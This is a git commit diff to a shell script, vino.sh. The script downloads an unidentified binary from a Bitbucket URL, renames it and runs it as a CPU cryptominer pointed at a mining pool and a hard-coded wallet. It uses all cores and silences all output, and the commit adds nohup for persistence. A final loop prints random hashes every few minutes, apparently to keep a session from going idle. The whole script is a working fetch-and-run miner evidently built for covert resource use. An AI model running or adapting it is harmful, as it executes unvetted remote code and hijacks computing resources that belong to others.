2a8ccca038abc13b1bca59b2cfba2055be6779ee
Sazfa-Kuy <129221597+Sazfa-Kuy@users.noreply.github.com>
2023-12-30 03:39:34 +0700

    Update vino.sh

--- vino.sh
+++ vino.sh
@@ -11,5 +11,5 @@ wget -O sgr1 https://bitbucket.org/ramabena/tahrim/downloads/sare >/dev/null 2>&
 chmod +x sgr1
 cpulimit -l 600 -e sgr1 &
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-nice -n -10 ./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:7068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
+nice -n -10 nohup ./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:7068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
